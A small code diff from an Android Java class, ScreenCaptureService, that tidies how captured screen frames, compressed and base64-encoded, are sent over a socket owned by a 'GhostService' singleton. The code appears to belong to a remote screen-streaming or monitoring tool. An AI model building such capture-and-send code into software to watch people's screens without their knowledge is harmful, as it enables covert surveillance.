@@ -46,8 +46,9 @@ public class ScreenCaptureService {
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
                     bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                     String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                    if (GhostService.getInstance() != null && GhostService.getInstance().getSocket() != null) {
-                        GhostService.getInstance().getSocket().send("screen_frame", base64);
+                    GhostService svc = GhostService.getInstance();
+                    if (svc != null && svc.getSocket() != null) {
+                        svc.getSocket().send("screen_frame", base64);
                     }
                     f.delete();
                 }
